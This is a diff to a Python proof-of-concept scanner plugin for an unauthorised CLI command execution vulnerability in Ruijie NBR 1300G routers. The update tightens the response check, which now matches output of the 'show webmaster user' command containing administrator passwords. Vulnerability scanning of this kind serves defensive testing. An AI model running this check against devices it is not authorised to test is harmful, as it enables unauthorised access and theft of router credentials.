@@ -10,14 +10,15 @@ class POC(POCBase):
 
     _info = {
         "author" : "jijue",                      # POC作者
-        "version" : "1",                    # POC版本，默认是1  
+        "version" : "2",                    # POC版本，默认是1  
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-        略  
+            v1:略  
+            v2:上一个版本的逻辑在面对一些特殊设备时会存在误报现象，故此此版本将匹配范围扩大，以降低误报
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "锐捷NBRNBR1300G 路由器 越权CLI命令执行漏洞",                        # 漏洞名称
+        "name" : "锐捷NBR 1300G 路由器 越权CLI命令执行漏洞",                        # 漏洞名称
         "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
         "AppName" : "锐捷NBRNBR1300G 路由器",                     # 漏洞应用名称
         "AppVersion" : "",                  # 漏洞应用版本
@@ -56,7 +57,11 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "webmaster" in req.text and "password" in req.text and req.status_code == 200 :
+            if "webmaster" in req.text and\
+                 "password" in req.text and\
+                      req.status_code == 200 and\
+                           "<TITLE>/WEB_VMS/LEVEL15/</TITLE></HEAD>" in req.text and\
+                               "Command was: show webmaster user" in req.text:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
